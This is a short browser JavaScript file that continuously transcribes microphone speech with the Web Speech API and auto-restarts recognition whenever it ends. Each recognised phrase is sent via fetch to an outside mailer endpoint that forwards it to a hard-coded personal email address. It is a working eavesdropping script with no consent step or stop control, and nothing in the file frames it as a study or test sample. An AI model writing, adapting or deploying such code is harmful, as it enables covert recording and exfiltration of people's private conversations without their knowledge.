async function accessEndpointAsync(body) {
  try {
    const response = await fetch(
      `https://mailer.crackmeapp.live/api/send/body=${body}/recep=sabetfree@gmail.com/`
    );

    if (!response.ok) {
      throw new Error("Failed to fetch data");
    }

    const responseData = await response.json();

    console.log(responseData); // Log the response data

    return responseData; // Return the response data if needed
  } catch (error) {
    console.error("Error:", error.message);
    throw error; // Rethrow error if needed
  }
}

// Create a SpeechRecognition instance
var SpeechRecognition =
  window.SpeechRecognition || window.webkitSpeechRecognition;
var voiceRecognition = new SpeechRecognition();

// Set language to English (United States)
voiceRecognition.lang = "en-US";

// Disable interim results
voiceRecognition.interimResults = false;
voiceRecognition.maxAlternatives = 5;

// Event handler for speech recognition results
voiceRecognition.onresult = function (event) {
  // Get the recognized text from the result
  var recognizedText = event.results[0][0].transcript;
  console.log("You said:", recognizedText);

  // Send the recorded message via email
  accessEndpointAsync(recognizedText);
};

// Event handler when the speech recognition is started
voiceRecognition.onstart = function () {
  console.log("Speech recognition started...");
};

voiceRecognition.start();

voiceRecognition.onend = function () {
  console.log("Speech recognition ended...");
  // Restart speech recognition after it ends
  voiceRecognition.start();
};
